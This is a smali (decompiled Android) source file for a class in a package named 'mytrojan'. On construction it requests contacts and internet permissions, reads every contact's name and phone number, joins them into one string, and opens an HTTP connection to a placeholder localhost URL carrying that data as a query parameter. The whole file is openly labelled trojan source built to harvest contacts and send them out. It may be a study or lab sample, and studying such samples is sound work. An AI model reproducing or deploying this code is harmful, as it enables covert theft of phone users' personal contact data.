.class public Lcom/example/mytrojan/ExecuteIt;
.super Ljava/lang/Object;
.source "ExecuteIt.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "TEST"


# instance fields
.field private ctx:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .registers 2
    .param p1, "ctx"    # Landroid/content/Context;

    .prologue
    .line 33
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 35
    iput-object p1, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;

    .line 36
    invoke-direct {p0}, Lcom/example/mytrojan/ExecuteIt;->getContactList()V

    .line 37
    return-void
.end method

.method private getContactList()V
    .registers 19

    .prologue
    .line 70
    new-instance v12, Ljava/util/ArrayList;

    invoke-direct {v12}, Ljava/util/ArrayList;-><init>()V

    .line 71
    .local v12, "mPers":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    const-string v2, "android.permission.READ_CONTACTS"

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/example/mytrojan/ExecuteIt;->hasPhonePermission(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_14

    .line 72
    const-string v2, "android.permission.READ_CONTACTS"

    invoke-interface {v12, v2}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 76
    :cond_14
    const-string v2, "android.permission.INTERNET"

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/example/mytrojan/ExecuteIt;->hasPhonePermission(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_23

    .line 78
    const-string v2, "android.permission.INTERNET"

    invoke-interface {v12, v2}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 81
    :cond_23
    invoke-interface {v12}, Ljava/util/List;->size()I

    move-result v2

    if-lez v2, :cond_37

    .line 82
    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/String;

    invoke-interface {v12, v2}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v2

    check-cast v2, [Ljava/lang/String;

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/example/mytrojan/ExecuteIt;->requestPermission([Ljava/lang/String;)V

    .line 85
    :cond_37
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    .line 86
    .local v1, "cr":Landroid/content/ContentResolver;
    sget-object v2, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v8

    .line 89
    .local v8, "cur":Landroid/database/Cursor;
    if-eqz v8, :cond_ed

    invoke-interface {v8}, Landroid/database/Cursor;->getCount()I

    move-result v2

    :goto_4f
    if-lez v2, :cond_124

    .line 90
    :cond_51
    :goto_51
    if-eqz v8, :cond_124

    invoke-interface {v8}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-eqz v2, :cond_124

    .line 91
    const-string v2, "_id"

    .line 92
    invoke-interface {v8, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    .line 91
    invoke-interface {v8, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    .line 93
    .local v10, "id":Ljava/lang/String;
    const-string v2, "display_name"

    invoke-interface {v8, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v8, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v13

    .line 96
    .local v13, "name":Ljava/lang/String;
    const-string v2, "has_phone_number"

    invoke-interface {v8, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v8, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v2

    if-lez v2, :cond_51

    .line 98
    sget-object v2, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const-string v4, "contact_id = ?"

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/String;

    const/4 v6, 0x0

    aput-object v10, v5, v6

    const/4 v6, 0x0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v14

    .line 105
    .local v14, "pCur":Landroid/database/Cursor;
    const-string v7, ""

    .line 106
    .local v7, "content":Ljava/lang/String;
    :goto_8b
    invoke-interface {v14}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-eqz v2, :cond_f0

    .line 107
    const-string v2, "data1"

    invoke-interface {v14, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v14, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v15

    .line 109
    .local v15, "phoneNo":Ljava/lang/String;
    const-string v2, "TEST"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Name: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 110
    const-string v2, "TEST"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Phone Number: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 112
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "#"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "#"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 113
    goto :goto_8b

    .line 89
    .end local v7    # "content":Ljava/lang/String;
    .end local v10    # "id":Ljava/lang/String;
    .end local v13    # "name":Ljava/lang/String;
    .end local v14    # "pCur":Landroid/database/Cursor;
    .end local v15    # "phoneNo":Ljava/lang/String;
    :cond_ed
    const/4 v2, 0x0

    goto/16 :goto_4f

    .line 114
    .restart local v7    # "content":Ljava/lang/String;
    .restart local v10    # "id":Ljava/lang/String;
    .restart local v13    # "name":Ljava/lang/String;
    .restart local v14    # "pCur":Landroid/database/Cursor;
    :cond_f0
    invoke-interface {v14}, Landroid/database/Cursor;->close()V

    .line 118
    :try_start_f3
    new-instance v16, Ljava/net/URL;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "http://127.0.0.1?content="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, v16

    invoke-direct {v0, v2}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 119
    .local v16, "url":Ljava/net/URL;
    invoke-virtual/range {v16 .. v16}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v17

    check-cast v17, Ljava/net/HttpURLConnection;

    .line 120
    .local v17, "urlConnection":Ljava/net/HttpURLConnection;
    invoke-virtual/range {v17 .. v17}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_116
    .catch Ljava/net/MalformedURLException; {:try_start_f3 .. :try_end_116} :catch_118
    .catch Ljava/io/IOException; {:try_start_f3 .. :try_end_116} :catch_11e

    goto/16 :goto_51

    .line 122
    .end local v16    # "url":Ljava/net/URL;
    .end local v17    # "urlConnection":Ljava/net/HttpURLConnection;
    :catch_118
    move-exception v9

    .line 123
    .local v9, "e":Ljava/net/MalformedURLException;
    invoke-virtual {v9}, Ljava/net/MalformedURLException;->printStackTrace()V

    goto/16 :goto_51

    .line 125
    .end local v9    # "e":Ljava/net/MalformedURLException;
    :catch_11e
    move-exception v11

    .line 126
    .local v11, "io":Ljava/io/IOException;
    invoke-virtual {v11}, Ljava/io/IOException;->printStackTrace()V

    goto/16 :goto_51

    .line 131
    .end local v7    # "content":Ljava/lang/String;
    .end local v10    # "id":Ljava/lang/String;
    .end local v11    # "io":Ljava/io/IOException;
    .end local v13    # "name":Ljava/lang/String;
    .end local v14    # "pCur":Landroid/database/Cursor;
    :cond_124
    if-eqz v8, :cond_129

    .line 132
    invoke-interface {v8}, Landroid/database/Cursor;->close()V

    .line 134
    :cond_129
    return-void
.end method

.method private hasPhonePermission(Ljava/lang/String;)Z
    .registers 6
    .param p1, "permission"    # Ljava/lang/String;

    .prologue
    .line 42
    const/4 v1, 0x0

    .line 45
    .local v1, "ret":Z
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x17

    if-lt v2, v3, :cond_11

    .line 48
    iget-object v2, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;

    invoke-static {v2, p1}, Landroid/support/v4/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    .line 50
    .local v0, "hasPermission":I
    if-nez v0, :cond_10

    .line 51
    const/4 v1, 0x1

    .line 58
    .end local v0    # "hasPermission":I
    :cond_10
    :goto_10
    return v1

    .line 55
    :cond_11
    const/4 v1, 0x1

    goto :goto_10
.end method

.method private requestPermission([Ljava/lang/String;)V
    .registers 5
    .param p1, "permission"    # [Ljava/lang/String;

    .prologue
    .line 64
    move-object v0, p1

    check-cast v0, [Ljava/lang/String;

    .line 65
    .local v0, "requestPermissionArray":[Ljava/lang/String;
    iget-object v1, p0, Lcom/example/mytrojan/ExecuteIt;->ctx:Landroid/content/Context;

    check-cast v1, Landroid/app/Activity;

    const/4 v2, 0x1

    invoke-static {v1, v0, v2}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    .line 66
    return-void
.end method
